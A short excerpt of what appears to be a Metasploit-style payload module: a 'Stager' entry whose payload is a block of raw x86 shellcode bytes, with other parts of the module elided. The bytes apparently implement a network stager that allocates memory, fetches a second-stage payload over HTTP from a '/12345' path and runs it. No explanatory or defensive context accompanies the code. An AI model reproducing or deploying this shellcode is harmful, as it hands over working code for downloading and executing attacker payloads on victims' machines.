      ...
      'Stager'        =>
        {
          ...
          'Payload' =>
            ...
            # Built on Tue Feb  4 09:05:59 2014
            ...
            "\x03\x53\x53\x68\x5C\x11\x00\x00\xEB\x39\x50\x68\x57\x89\x9F\xC6" +
            "\xFF\xD5\x53\x68\x00\x02\x60\x84\x53\x53\x53\xEB\x28\x53\x50\x68" +
            "\xEB\x55\x2E\x3B\xFF\xD5\x96\x6A\x10\x59\x53\x53\x53\x53\x56\x68" +
            "\x2D\x06\x18\x7B\xFF\xD5\x85\xC0\x75\x17\xE0\xEE\x68\xF0\xB5\xA2" +
            "\x56\xFF\xD5\xEB\x42\xE8\xD3\xFF\xFF\xFF\x2F\x31\x32\x33\x34\x35" +
            "\x00\x6A\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x53\x68\x58" +
            "\xA4\x53\xE5\xFF\xD5\x93\x53\x53\x89\xE7\x57\x68\x00\x20\x00\x00" +
            "\x53\x56\x68\x12\x96\x89\xE2\xFF\xD5\x85\xC0\x74\xBF\x8B\x07\x01" +
            "\xC3\x85\xC0\x75\xE5\x58\xC3\xE8\x7E\xFF\xFF\xFF"
